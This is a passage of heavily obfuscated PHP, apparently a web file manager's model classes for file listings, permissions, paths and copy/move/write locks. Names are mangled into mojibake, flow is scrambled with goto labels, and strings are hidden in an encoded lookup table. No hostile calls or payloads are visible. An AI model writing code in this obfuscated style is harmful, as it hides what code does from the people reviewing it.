\164\145\75{$dÇİ•Ğ£ù}\x29\x20\x61\163\40\x74\142\62\137{$b…óª¥¿Êô}\40\165\156\x69\157\x6e\x20\x61\x6c\x6c\x20"; } if ((strlen($dÍÌ‚Œ×ªé) >= $cö±ò• || $a˜”Şù†Ø­ == $F¾ƒŒ–…æÚ - 1) && $dÍÌ‚Œ×ªé) { $dÍÌ‚Œ×ªé = substr($dÍÌ‚Œ×ªé, 0, -strlen($cñğ²¼ë£ö[466])); $E™¬Åóˆ±İ = $this->query($dÍÌ‚Œ×ªé); $c‚ ‚²Àñì = array_merge($c‚ ‚²Àñì, $E™¬Åóˆ±İ); $dÍÌ‚Œ×ªé = $cñğ²¼ë£ö[33]; } } $c‚ ‚²Àñì = array_to_keyvalue($c‚ ‚²Àñì, $cñğ²¼ë£ö[467]); goto fÄË¦ˆº¦ğ; fÓ§‘êå½Ë: } protected function _listAppendAuth(&$EöÀ¥Ö·ã) { goto Aç›ßêÚÚ; a”íÈâŠÜ™: $Fñ¼±Äã×é = Model($f‘“²î—Æ[471])->getSourceList($D½ùÉ¤æÕ°, $E¨»Ì¼¼ö); foreach ($EöÀ¥Ö·ã as $E÷ñÏó»õµ => &$aÏÄñè†‡Ã) { $aÏÄñè†‡Ã[$f‘“²î—Æ[392]] = $Fñ¼±Äã×é[$aÏÄñè†‡Ã[$f‘“²î—Æ[385]]]; if (!$aÏÄñè†‡Ã[$f‘“²î—Æ[392]] && $aÏÄñè†‡Ã[$f‘“²î—Æ[387]] == self::TYPE_GROUP) { $aÏÄñè†‡Ã[$f‘“²î—Æ[392]] = Action($f‘“²î—Æ[472])->pathGroupAuthMake($aÏÄñè†‡Ã[$f‘“²î—Æ[473]]); if (!$aÏÄñè†‡Ã[$f‘“²î—Æ[392]] && !_get($GLOBALS, $f‘“²î—Æ[474])) { $aÏÄñè†‡Ã[$f‘“²î—Æ[192]] = !1; $aÏÄñè†‡Ã[$f‘“²î—Æ[191]] = !1; } } if ($aÏÄñè†‡Ã[$f‘“²î—Æ[392]]) { $aÏÄñè†‡Ã[$f‘“²î—Æ[192]] = AuthModel::authCheckEdit($aÏÄñè†‡Ã[$f‘“²î—Æ[392]][$f‘“²î—Æ[393]]); $aÏÄñè†‡Ã[$f‘“²î—Æ[191]] = AuthModel::authCheckView($aÏÄñè†‡Ã[$f‘“²î—Æ[392]][$f‘“²î—Æ[393]]); } $this->groupPathDisplay($aÏÄñè†‡Ã); } unset($aÏÄñè†‡Ã); goto b–¿ŒÙ¾ìé; BÍöñ¶Á£–: foreach ($EöÀ¥Ö·ã as $aÏÄñè†‡Ã) { if ($aÏÄñè†‡Ã[$f‘“²î—Æ[387]] == self::TYPE_GROUP) { $D½ùÉ¤æÕ°[] = $aÏÄñè†‡Ã[$f‘“²î—Æ[385]]; } } if (!$D½ùÉ¤æÕ°) { return; } $E¨»Ì¼¼ö = array_to_keyvalue($EöÀ¥Ö·ã, $f‘“²î—Æ[385]); goto a”íÈâŠÜ™; Aç›ßêÚÚ: $f‘“²î—Æ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!defined($f‘“²î—Æ[442])) { return; } $D½ùÉ¤æÕ° = array(); goto BÍöñ¶Á£–; b–¿ŒÙ¾ìé: } public function groupPathDisplay(&$CÛáŒƒ¼•ö) { goto bïÔê¡¤Ì; Eö»ïºì: $B£á‚ä¯‡Ñ = $this->parentLevelArray($B”Ã±÷Œø[$A©„ªùëÍ[476]]); $aò»ì™à¾² = $A©„ªùëÍ[33]; foreach ($B£á‚ä¯‡Ñ as $a¨Ô»ÊÛç) { $d’…éŠñ‡ö = Model($A©„ªùëÍ[475])->getInfo($a¨Ô»ÊÛç); $aò»ì™à¾² .= $d’…éŠñ‡ö[$A©„ªùëÍ[407]][$A©„ªùëÍ[385]] . $A©„ªùëÍ[47]; } goto EÈŠÜ…ÚË; EÈŠÜ…ÚË: $CÛáŒƒ¼•ö[$A©„ªùëÍ[477]] = $B”Ã±÷Œø[$A©„ªùëÍ[478]]; $CÛáŒƒ¼•ö[$A©„ªùëÍ[396]] = $B”Ã±÷Œø[$A©„ªùëÍ[476]]; $CÛáŒƒ¼•ö[$A©„ªùëÍ[479]] = $B”Ã±÷Œø[$A©„ªùëÍ[480]]; goto eÌ˜¼„Àœ‡; bïÔê¡¤Ì: $A©„ªùëÍ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($CÛáŒƒ¼•ö[$A©„ªùëÍ[387]] != self::TYPE_GROUP) { return; } $B”Ã±÷Œø = Model($A©„ªùëÍ[475])->getInfo($CÛáŒƒ¼•ö[$A©„ªùëÍ[473]]); goto Eö»ïºì; eÌ˜¼„Àœ‡: $CÛáŒƒ¼•ö[$A©„ªùëÍ[481]] = $aò»ì™à¾² . $B”Ã±÷Œø[$A©„ªùëÍ[407]][$A©„ªùëÍ[385]]; goto fõ«ä”Ü÷¶; fõ«ä”Ü÷¶: } protected function _listAppendPath(&$D‡–È¥¡àÓ) { goto aôèªË±„ù; aôèªË±„ù: $dñæØ¦–é¤ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; static $c¼õ†ÖíÚ½ = array(); $F½ÒŞôÁº = array(); goto D†Ôöä²²¬; D†Ôöä²²¬: foreach ($D‡–È¥¡àÓ as &$e„ŠÃì½óŞ) { $c¼õ†ÖíÚ½[$e„ŠÃì½óŞ[$dñæØ¦–é¤[385]]] = $e„ŠÃì½óŞ[$dñæØ¦–é¤[28]]; $fç¨“À  = $this->parentLevelArray($e„ŠÃì½óŞ[$dñæØ¦–é¤[476]]); foreach ($fç¨“À  as $AÚ²‘ê½—ö => $E®ØØä‚¦”) { if ($AÚ²‘ê½—ö != 0 && !isset($c¼õ†ÖíÚ½[$E®ØØä‚¦”])) { $F½ÒŞôÁº[] = $E®ØØä‚¦”; } } } unset($e„ŠÃì½óŞ); if (count($F½ÒŞôÁº) > 0) { $aÙ˜Íª˜È = array($dñæØ¦–é¤[399] => array($dñæØ¦–é¤[400], $F½ÒŞôÁº)); if (count($F½ÒŞôÁº) == 1) { $a£½â•ù¹¥ = $this->sourceInfo($F½ÒŞôÁº[0]); $fÇ·İŞ«†É = is_array($a£½â•ù¹¥) ? array($a£½â•ù¹¥) : !1; } else { $fÇ·İŞ«†É = $this->field($dñæØ¦–é¤[482])->where($aÙ˜Íª˜È)->select(); } $A±‹›î¾Ó® = array_to_keyvalue($fÇ·İŞ«†É, $dñæØ¦–é¤[385], $dñæØ¦–é¤[28]); $c¼õ†ÖíÚ½ = array_merge_index($c¼õ†ÖíÚ½, $A±‹›î¾Ó®); } goto F“˜‹Œ×ÖÆ; F“˜‹Œ×ÖÆ: $D™¢ÁƒÇ‘’ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($D‡–È¥¡àÓ as &$e„ŠÃì½óŞ) { goto eñ‚ÆÒùŒ; dÈÎ£Ñˆö‘: if ($fç¨“À ) { $f–‡™ôìÙº .= $e„ŠÃì½óŞ[$dñæØ¦–é¤[28]]; } if ($e„ŠÃì½óŞ[$dñæØ¦–é¤[386]]) { $f–‡™ôìÙº .= $dñæØ¦–é¤[8]; } $e„ŠÃì½óŞ[$dñæØ¦–é¤[483]] = str_replace($dñæØ¦–é¤[484], $dñæØ¦–é¤[8], $f–‡™ôìÙº); goto d¹¬±¿ùœà; eñ‚ÆÒùŒ: $fç¨“À  = $this->parentLevelArray($e„ŠÃì½óŞ[$dñæØ¦–é¤[476]]); $f–‡™ôìÙº = $this->_listAppendPathRoot($e„ŠÃì½óŞ, $fç¨“À ); foreach ($fç¨“À  as $AÚ²‘ê½—ö => $E®ØØä‚¦”) { if ($AÚ²‘ê½—ö == 0 && $f–‡™ôìÙº && $e„ŠÃì½óŞ[$dñæØ¦–é¤[387]] == self::TYPE_GROUP) { continue; } if (isset($c¼õ†ÖíÚ½[$E®ØØä‚¦”])) { $f–‡™ôìÙº .= $c¼õ†ÖíÚ½[$E®ØØä‚¦”] . $dñæØ¦–é¤[8]; } } goto dÈÎ£Ñˆö‘; d¹¬±¿ùœà: $fÚ²•‹äÃ¢ = trim($e„ŠÃì½óŞ[$dñæØ¦–é¤[483]], $dñæØ¦–é¤[8]); if ($e„ŠÃì½óŞ[$dñæØ¦–é¤[478]] == $dñæØ¦–é¤[485] && $fÚ²•‹äÃ¢) { $e„ŠÃì½óŞ[$dñæØ¦–é¤[28]] = $fÚ²•‹äÃ¢; } $this->_listAppendPathRecycle($e„ŠÃì½óŞ, $fç¨“À , $D™¢ÁƒÇ‘’); goto Cˆ…”øÍ¥´; Cˆ…”øÍ¥´: } unset($e„ŠÃì½óŞ); goto c‚§ï’âÌŒ; c‚§ï’âÌŒ: return $D‡–È¥¡àÓ; goto DÄµªååÙª; DÄµªååÙª: } private function _listAppendPathRecycle(&$Dç¾³¤¼ŞŒ, $c™İõ–¬Ûª, $A‡Úà•ŒÅ) { goto dğ‡ÖƒÏÂ­; DƒÂ”µˆÕ©: $Bó†Çïë¢ = explode($C÷˜Û§èé[8], trim($Dç¾³¤¼ŞŒ[$C÷˜Û§èé[483]], $C÷˜Û§èé[8])); $BÎËòë¸à¹ = implode($C÷˜Û§èé[8], array_slice($Bó†Çïë¢, 2)); $Dç¾³¤¼ŞŒ[$C÷˜Û§èé[483]] = $C÷˜Û§èé[8] . LNG($C÷˜Û§èé[486]) . $C÷˜Û§èé[8] . ltrim($BÎËòë¸à¹, $C÷˜Û§èé[8]); goto bĞƒÇÌİˆ÷; bĞƒÇÌİˆ÷: $Dç¾³¤¼ŞŒ[$C÷˜Û§èé[476]] = $C÷˜Û§èé[487] . implode($C÷˜Û§èé[47], array_slice($c™İõ–¬Ûª, 1)) . $C÷˜Û§èé[47]; if ($Dç¾³¤¼ŞŒ[$C÷˜Û§èé[385]] == $A‡Úà•ŒÅ) { $Dç¾³¤¼ŞŒ[$C÷˜Û§èé[476]] = $C÷˜Û§èé[487]; $Dç¾³¤¼ŞŒ[$C÷˜Û§èé[478]] = $C÷˜Û§èé[485]; $Dç¾³¤¼ŞŒ[$C÷˜Û§èé[28]] = LNG($C÷˜Û§èé[486]); } $Dç¾³¤¼ŞŒ[$C÷˜Û§èé[488]] = $C÷˜Û§èé[489]; goto Cå…³ñ„èƒ; dğ‡ÖƒÏÂ­: $C÷˜Û§èé =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (intval($Dç¾³¤¼ŞŒ[$C÷˜Û§èé[387]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($A‡Úà•ŒÅ, $c™İõ–¬Ûª) && $Dç¾³¤¼ŞŒ[$C÷˜Û§èé[385]] != $A‡Úà•ŒÅ) { return; } goto DƒÂ”µˆÕ©; Cå…³ñ„èƒ: } protected function _listAppendPathRoot(&$D•˜·ÈÜÌ, $cù¯’Ûê¸Á) { $fª¯ß¿Î‹‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AÉ¿¦†Ú¿ = $fª¯ß¿Î‹‰[33]; if ($D•˜·ÈÜÌ[$fª¯ß¿Î‹‰[387]] == self::TYPE_USER) { if (defined($fª¯ß¿Î‹‰[442]) && $D•˜·ÈÜÌ[$fª¯ß¿Î‹‰[473]] == USER_ID) { $AÉ¿¦†Ú¿ = LNG($fª¯ß¿Î‹‰[490]); if (!$cù¯’Ûê¸Á) { $D•˜·ÈÜÌ[$fª¯ß¿Î‹‰[28]] = $AÉ¿¦†Ú¿; } } else { $AÖÚ‘Øî°ô = Model($fª¯ß¿Î‹‰[491])->getInfoSimple($D•˜·ÈÜÌ[$fª¯ß¿Î‹‰[473]]); $AÉ¿¦†Ú¿ = LNG($fª¯ß¿Î‹‰[492]) . $fª¯ß¿Î‹‰[157] . $AÖÚ‘Øî°ô[$fª¯ß¿Î‹‰[28]] . $fª¯ß¿Î‹‰[493]; } } else { if ($D•˜·ÈÜÌ[$fª¯ß¿Î‹‰[387]] == self::TYPE_GROUP) { $AÖÚ‘Øî°ô = Model($fª¯ß¿Î‹‰[475])->getInfoSimple($D•˜·ÈÜÌ[$fª¯ß¿Î‹‰[473]]); $AÉ¿¦†Ú¿ = $AÖÚ‘Øî°ô[$fª¯ß¿Î‹‰[28]]; } else { if ($D•˜·ÈÜÌ[$fª¯ß¿Î‹‰[387]] == self::TYPE_SYSTEM) { $AÖÚ‘Øî°ô = $this->sourceInfo($cù¯’Ûê¸Á[0], !0); $AÉ¿¦†Ú¿ = $AÖÚ‘Øî°ô[$fª¯ß¿Î‹‰[28]]; } } } $AÉ¿¦†Ú¿ = $AÉ¿¦†Ú¿ ? $fª¯ß¿Î‹‰[8] . $AÉ¿¦†Ú¿ . $fª¯ß¿Î‹‰[8] : $fª¯ß¿Î‹‰[8]; return $AÉ¿¦†Ú¿; } protected function _listAppendUser(&$C…“Êº‰) { goto B—½İšÂÏ; fÒ›ôöµ²: $F¥¥ºß¼¯Ö = array_merge($F¦¢¶§ùãŒ, $B£•åÃö‡è); $A‡ÖÀğ¦÷ = Model($eÌ³…¹ì…[494])->userListInfo($F¥¥ºß¼¯Ö); foreach ($C…“Êº‰ as &$bÎ‡·÷ƒï¸) { $BÉ»º†¡Ûƒ = $bÎ‡·÷ƒï¸[$eÌ³…¹ì…[394]]; $bÎ‡·÷ƒï¸[$eÌ³…¹ì…[394]] = $A‡ÖÀğ¦÷[$BÉ»º†¡Ûƒ] ? $A‡ÖÀğ¦÷[$BÉ»º†¡Ûƒ] : !1; $BÉ»º†¡Ûƒ = $bÎ‡·÷ƒï¸[$eÌ³…¹ì…[395]]; $bÎ‡·÷ƒï¸[$eÌ³…¹ì…[395]] = $A‡ÖÀğ¦÷[$BÉ»º†¡Ûƒ] ? $A‡ÖÀğ¦÷[$BÉ»º†¡Ûƒ] : !1; if (isset($bÎ‡·÷ƒï¸[$eÌ³…¹ì…[433]]) && $bÎ‡·÷ƒï¸[$eÌ³…¹ì…[433]][$eÌ³…¹ì…[495]]) { $dİ‘­Ïêù… = $GLOBALS[$eÌ³…¹ì…[6]][$eÌ³…¹ì…[84]][$eÌ³…¹ì…[496]]; if ($bÎ‡·÷ƒï¸[$eÌ³…¹ì…[433]][$eÌ³…¹ì…[497]] <= time() - $dİ‘­Ïêù…) { $this->metaSet($bÎ‡·÷ƒï¸[$eÌ³…¹ì…[385]], $eÌ³…¹ì…[495], null); $this->metaSet($bÎ‡·÷ƒï¸[$eÌ³…¹ì…[385]], $eÌ³…¹ì…[497], null); unset($bÎ‡·÷ƒï¸[$eÌ³…¹ì…[433]][$eÌ³…¹ì…[495]]); continue; } $aÔ¶Ñ˜é¯Î = $bÎ‡·÷ƒï¸[$eÌ³…¹ì…[433]][$eÌ³…¹ì…[495]]; $bÎ‡·÷ƒï¸[$eÌ³…¹ì…[433]][$eÌ³…¹ì…[498]] = Model($eÌ³…¹ì…[494])->getInfoSimpleOuter($aÔ¶Ñ˜é¯Î); } } goto FÙñ±êˆĞ; B—½İšÂÏ: $eÌ³…¹ì… =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F¦¢¶§ùãŒ = array_to_keyvalue($C…“Êº‰, $eÌ³…¹ì…[33], $eÌ³…¹ì…[394]); $B£•åÃö‡è = array_to_keyvalue($C…“Êº‰, $eÌ³…¹ì…[33], $eÌ³…¹ì…[395]); goto fÒ›ôöµ²; FÙñ±êˆĞ: unset($bÎ‡·÷ƒï¸); goto b¯Ê·‹Î‡; b¯Ê·‹Î‡: } public function parentLevelArray($bˆ³ôÒÌá) { $E­é›Ä·î =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bˆ³ôÒÌá = explode($E­é›Ä·î[47], trim($bˆ³ôÒÌá, $E­é›Ä·î[47])); return array_remove_value($bˆ³ôÒÌá, $E­é›Ä·î[485]); } public function listAll($D›ï¹‰À») { goto CÁÈâŒí¬ô; aé£íËÚêã: $FñĞÜœÇ®Ø = array(); foreach ($FäÓ“Í— as $CĞñô…óùÕ => $F¹İÜ·†‚÷) { goto dÛ¸™éÂ§; c¦‡Úê¶Úø: if (!$F¹İÜ·†‚÷[$cÀ°Ùšæ™[386]]) { $cÈº½å²«×[$cÀ°Ùšæ™[435]] = $F¹İÜ·†‚÷[$cÀ°Ùšæ™[435]]; $cÈº½å²«×[$cÀ°Ùšæ™[506]] = $F¹İÜ·†‚÷[$cÀ°Ùšæ™[75]]; } $FñĞÜœÇ®Ø[] = $cÈº½å²«×; goto e÷Âìƒ‹½„; C¶Ø¾é¦£ç: $bÜ„ƒ—§è = str_replace($cÀ°Ùšæ™[484], $cÀ°Ùšæ™[8], $bÜ„ƒ—§è); $bÜ„ƒ—§è = str_replace($cÀ°Ùšæ™[484], $cÀ°Ùšæ™[8], $bÜ„ƒ—§è); $cÈº½å²«× = array($cÀ°Ùšæ™[403] => str_replace($cÀ°Ùšæ™[484], $cÀ°Ùšæ™[8], $bÜ„ƒ—§è), $cÀ°Ùšæ™[505] => intval($F¹İÜ·†‚÷[$cÀ°Ùšæ™[386]]), $cÀ°Ùšæ™[407] => $this->pathInfoFilter($F¹İÜ·†‚÷, !0)); goto c¦‡Úê¶Úø; aîé‰ÆÍ†á: for ($dË—§ïáìÙ = 0; $dË—§ïáìÙ < count($F¡Õ¬‡‰®); $dË—§ïáìÙ++) { $bÜ„ƒ—§è .= $FäÓ“Í—[$F¡Õ¬‡‰®[$dË—§ïáìÙ]][$cÀ°Ùšæ™[28]] . $cÀ°Ùšæ™[8]; } $bÜ„ƒ—§è .= $F¹İÜ·†‚÷[$cÀ°Ùšæ™[28]]; if ($F¹İÜ·†‚÷[$cÀ°Ùšæ™[386]]) { $bÜ„ƒ—§è .= $cÀ°Ùšæ™[8]; } goto C¶Ø¾é¦£ç; dÛ¸™éÂ§: $F¡Õ¬‡‰® = $this->parentLevelArray($F¹İÜ·†‚÷[$cÀ°Ùšæ™[476]]); array_shift($F¡Õ¬‡‰®); $bÜ„ƒ—§è = $d¹ìéŒÙ²; goto aîé‰ÆÍ†á; e÷Âìƒ‹½„: } return $FñĞÜœÇ®Ø; goto eÍ„Ë°¨æ; f™¿æ¾Œ•œ: $aªøîäÓ° = $cÀ°Ùšæ™[503]; $EîŠ¹‰¹Âê = "\114\105\x46\x54\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\x69\x6f\137\146\151\x6c\x65\x20\x66\151\154\145\x20\x6f\156\40\x73\x6f\165\x72\143\x65\56\146\x69\x6c\145\111\x44\40\x3d\x20\146\151\x6c\145\56\146\151\154\145\111\104"; $FäÓ“Í— = $this->alias($cÀ°Ùšæ™[504])->field($aªøîäÓ°)->where($cê‰†¯©åó)->join($EîŠ¹‰¹Âê)->select(); goto Eİ—·´À—ã; Eİ—·´À—ã: $this->_listAppendAuth($FäÓ“Í—); $this->_listAppendUser($FäÓ“Í—); $this->_listAppendPath($FäÓ“Í—); goto bÉ“–†ò¡; bÉ“–†ò¡: $FäÓ“Í— = array_to_keyvalue($FäÓ“Í—, $cÀ°Ùšæ™[385]); $d¹ìéŒÙ² = "\x2f{$a–Ê¼„ïÂ[$cÀ°Ùšæ™[28]]}\57"; $d¹ìéŒÙ² = $d¹ìéŒÙ² == $cÀ°Ùšæ™[484] ? $cÀ°Ùšæ™[8] : $d¹ìéŒÙ²; goto aé£íËÚêã; CÁÈâŒí¬ô: $cÀ°Ùšæ™ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a–Ê¼„ïÂ = $this->sourceInfo($D›ï¹‰À»); $cê‰†¯©åó = array($cÀ°Ùšæ™[499] => array($cÀ°Ùšæ™[500], $a–Ê¼„ïÂ[$cÀ°Ùšæ™[476]] . $D›ï¹‰À» . $cÀ°Ùšæ™[501]), $cÀ°Ùšæ™[502] => 0); goto f™¿æ¾Œ•œ; eÍ„Ë°¨æ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($AÛòÕÃ¥êÌ) { goto b«¬ßĞö†”; D‹ÖÄÕÁò¶: $this->_lockEvent($AÛòÕÃ¥êÌ, array($cŸö²ÛÛÀ[510], $cŸö²ÛÛÀ[511]), $BÊ„“ÔÂ…“); $this->_lockCheckEnd($cŸö²ÛÛÀ[507], $AÛòÕÃ¥êÌ); goto bî’Á£­Ù˜; b«¬ßĞö†”: $cŸö²ÛÛÀ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->allowLock()) { return; } $this->_lockCheck($cŸö²ÛÛÀ[507], $AÛòÕÃ¥êÌ); goto eØêµ¥…“; eØêµ¥…“: $BÊ„“ÔÂ…“ = 1; $this->_lockEvent($AÛòÕÃ¥êÌ, array($cŸö²ÛÛÀ[508], $cŸö²ÛÛÀ[509]), $BÊ„“ÔÂ…“); $this->_lockParent($AÛòÕÃ¥êÌ, array($cŸö²ÛÛÀ[509]), $BÊ„“ÔÂ…“); goto D‹ÖÄÕÁò¶; bî’Á£­Ù˜: } public function lockCopyEnd($Aƒì¢†ÌÅ¤) { $aöÑ¤ºÊ­Ë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->allowLock()) { return; } $fÀ™îíš¨° = 0; $this->_lockEvent($Aƒì¢†ÌÅ¤, array($aöÑ¤ºÊ­Ë[508], $aöÑ¤ºÊ­Ë[509]), $fÀ™îíš¨°); $this->_lockParent($Aƒì¢†ÌÅ¤, array($aöÑ¤ºÊ­Ë[509]), $fÀ™îíš¨°); $this->_lockEvent($Aƒì¢†ÌÅ¤, array($aöÑ¤ºÊ­Ë[510], $aöÑ¤ºÊ­Ë[511]), $fÀ™îíš¨°); } public function lockWriteStart($B·†ãÇ½ÜÌ, $Aò‘Ä”ÑÛ = '') { goto aÇ Û’½´Î; aÇ Û’½´Î: $B›å¡Øå—‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->allowLock()) { return; } $this->_lockCheck($B›å¡Øå—‰[508], $B·†ãÇ½ÜÌ); goto bç­˜ ‰ÇÑ; cÊŠÏ£ùó‹: $this->_lockParent($B·†ãÇ½ÜÌ, array($B›å¡Øå—‰[507], $B›å¡Øå—‰[509]), $FêÜ·Î£„); $this->_lockCheckEnd($B›å¡Øå—‰[508], $B·†ãÇ½ÜÌ); goto CÃÄ›ÚÃ‹†; bç­˜ ‰ÇÑ: $FêÜ·Î£„ = 1; $this->_lockKey($B›å¡Øå—‰[512] . $B·†ãÇ½ÜÌ . $B›å¡Øå—‰[91] . $Aò‘Ä”ÑÛ, $FêÜ·Î£„); $this->_lockEvent($B·†ãÇ½ÜÌ, array($B›å¡Øå—‰[507], $B›å¡Øå—‰[509]), $FêÜ·Î£„); goto cÊŠÏ£ùó‹; CÃÄ›ÚÃ‹†: } public function lockWriteEnd($CïÊ«£˜ä‚, $bÚÜÎ‚¢êí = '') { $dÌõîõ‡ªé =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->allowLock()) { return; } $FĞŠ¢¹ÄØÀ = 0; $this->_lockKey($dÌõîõ‡ªé[512] . $CïÊ«£˜ä‚ . $dÌõîõ‡ªé[91] . $bÚÜÎ‚¢êí, $FĞŠ¢¹ÄØÀ); $this->_lockEvent($CïÊ«£˜ä‚, array($dÌõîõ‡ªé[507], $dÌõîõ‡ªé[509]), $FĞŠ¢¹ÄØÀ); $this->_lockParent($CïÊ«£˜ä‚, array($dÌõîõ‡ªé[507], $dÌõîõ‡ªé[509]), $FĞŠ¢¹ÄØÀ); } public function lockMoveStart($AŸí§í£¬õ) { goto B»‹øÆŠŸ‘; D©ï—Î§„ó: $cê˜« Àˆ = 1; $this->_lockKey($Eê†©¼™“‹[513] . $AŸí§í£¬õ, $cê˜« Àˆ); $this->_lockEvent($AŸí§í£¬õ, array($Eê†©¼™“‹[507], $Eê†©¼™“‹[508]), $cê˜« Àˆ); goto d–ßØ¤ß¿; B»‹øÆŠŸ‘: $Eê†©¼™“‹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->allowLock()) { return; } $this->_lockCheck($Eê†©¼™“‹[509], $AŸí§í£¬õ); goto D©ï—Î§„ó; d–ßØ¤ß¿: $this->_lockParent($AŸí§í£¬õ, array($Eê†©¼™“‹[507], $Eê†©¼™“‹[509]), $cê˜« Àˆ); $this->_lockEvent($AŸí§í£¬õ, array($Eê†©¼™“‹[514], $Eê†©¼™“‹[510], $Eê†©¼™“‹[511]), $cê˜« Àˆ); $this->_lockCheckEnd($Eê†©¼™“‹[509], $AŸí§í£¬õ); goto DÎªà”µÆ˜; DÎªà”µÆ˜: } public function lockMoveEnd($aãôäà©¨”) { goto eÈïÏ¨Àì•; d—ôâªò›¸: $this->_lockEvent($aãôäà©¨”, array($Bøê÷éƒõ[514], $Bøê÷éƒõ[510], $Bøê÷éƒõ[511]), $cÚêğß”ƒˆ); goto e‰¸‘È‹º; eÈïÏ¨Àì•: $Bøê÷éƒõ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->allowLock()) { return; } $cÚêğß”ƒˆ = 0; goto Eï¥¸ÛÂ†‰; Eï¥¸ÛÂ†‰: $this->_lockKey($Bøê÷éƒõ[513] . $aãôäà©¨”, $cÚêğß”ƒˆ); $this->_lockEvent($aãôäà©¨”, array($Bøê÷éƒõ[507], $Bøê÷éƒõ[508]), $cÚêğß”ƒˆ); $this->_lockParent($aãôäà©¨”, array($Bøê÷éƒõ[507], $Bøê÷éƒõ[509]), $cÚêğß”ƒˆ); goto d—ôâªò›¸; e‰¸‘È‹º: } private function _lockCheck($eºµ¿¯ù£¬, $cè½ò·§®) { goto Få¼…ƒÈ‹¥; F­„†ˆßÙÍ: $FÆëø‘ÃÓğ = array_reverse($this->parentLevelArray($dé‘‘‡Êàá[$a‰Ğ™ÈŒ‹˜[476]])); foreach ($FÆëø‘ÃÓğ as $bÁô—„“˜) { $CÜ•å²Å¿¿ = $eºµ¿¯ù£¬ . $a‰Ğ™ÈŒ‹˜[516] . $bÁô—„“˜; if (CacheLock::lockGet($a‰Ğ™ÈŒ‹˜[517] . $CÜ•å²Å¿¿)) { $dé‘‘‡Êàá = $this->sourceInfo($bÁô—„“˜); CacheLock::setErrorMsg($a‰Ğ™ÈŒ‹˜[157] . htmlspecialchars($dé‘‘‡Êàá[$a‰Ğ™ÈŒ‹˜[28]]) . $a‰Ğ™ÈŒ‹˜[493] . $b»¨çêµÀ±); $this->_lockKey($CÜ•å²Å¿¿, 1); $this->_lockKey($CÜ•å²Å¿¿, 0); } } goto CÁÜ¤ë­œÙ; B›àŞ•´…‹: CacheLock::setErrorMsg($a‰Ğ™ÈŒ‹˜[157] . htmlspecialchars($dé‘‘‡Êàá[$a‰Ğ™ÈŒ‹˜[28]]) . $a‰Ğ™ÈŒ‹˜[493] . $b»¨çêµÀ±); $this->_lockKey($CÜ•å²Å¿¿, 1); $this->_lockKey($CÜ•å²Å¿¿, 0); goto F­„†ˆßÙÍ; fÆ °ëéÀ: $this->_lockTimeStart[$CÜ•å²Å¿¿] = timeFloat(); if (!is_array($dé‘‘‡Êàá)) { return; } $b»¨çêµÀ± = LNG($a‰Ğ™ÈŒ‹˜[515]); goto B›àŞ•´…‹; Få¼…ƒÈ‹¥: $a‰Ğ™ÈŒ‹˜ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dé‘‘‡Êàá = $this->sourceInfo($cè½ò·§®); $CÜ•å²Å¿¿ = $eºµ¿¯ù£¬ . $a‰Ğ™ÈŒ‹˜[91] . $cè½ò·§®; goto fÆ °ëéÀ; CÁÜ¤ë­œÙ: } private function _lockCheckEnd($E†£¬ÄÙ©Ç, $A †’õéŒ») { goto bÊ¹Šâ®ì‡; cèÌÇ´Ğê¤: if ($fÔÎÃøöÍ÷ > 0.5) { unset(self::$cacheSourceInfo[$Dò”ê—õ°÷[426] . $A †’õéŒ»]); } $DØÉ¸£«°æ = $this->sourceInfo($A †’õéŒ»); if (!$DØÉ¸£«°æ) { show_json(LNG($Dò”ê—õ°÷[101]), !1); } goto F–ëäİÉ‹é; bÊ¹Šâ®ì‡: $Dò”ê—õ°÷ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $d‰…¥Ô„¨ = $E†£¬ÄÙ©Ç . $Dò”ê—õ°÷[91] . $A †’õéŒ»; CacheLock::setErrorMsg($Dò”ê—õ°÷[368]); goto AíŸÇˆÏĞ; AíŸÇˆÏĞ: if (!isset($this->_lockTimeStart[$d‰…¥Ô„¨])) { return; } $fÔÎÃøöÍ÷ = timeFloat() - $this->_lockTimeStart[$d‰…¥Ô„¨]; unset($this->_lockTimeStart[$d‰…¥Ô„¨]); goto cèÌÇ´Ğê¤; F–ëäİÉ‹é: } private function _lockParent($e“…å¡¢î², $Bâ˜×¨‡ª¬, $a§¨¶¶øÒ…) { if (!$this->autoLockSet) { return; } $c¤»ª¬¾Œ‡ = $this->sourceInfo($e“…å¡¢î²); if (!is_array($c¤»ª¬¾Œ‡)) { return; } $fÜƒøôšÕÏ = array_reverse($this->parentLevelArray($c¤»ª¬¾Œ‡[$_SERVER[ÈİÅ¿ÈÈ¥×][476]])); foreach ($fÜƒøôšÕÏ as $bàá²´à½) { $this->_lockEvent($bàá²´à½, $Bâ˜×¨‡ª¬, $a§¨¶¶øÒ…); } } private function _lockEvent($EôíÈ–™°ƒ, $bøñ¸ØŠ«Î, $E¯¹¯‡«ç) { $CÄ…š‡·Şì =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->autoLockSet) { return; } foreach ($bøñ¸ØŠ«Î as $b‘Òˆù…©É) { $F‚÷’…²Óñ = $b‘Òˆù…©É . $CÄ…š‡·Şì[91] . $EôíÈ–™°ƒ; if ($E¯¹¯‡«ç && CacheLock::lockGet($CÄ…š‡·Şì[517] . $F‚÷’…²Óñ)) { continue; } $this->_lockKey($F‚÷’…²Óñ, $E¯¹¯‡«ç); } } public 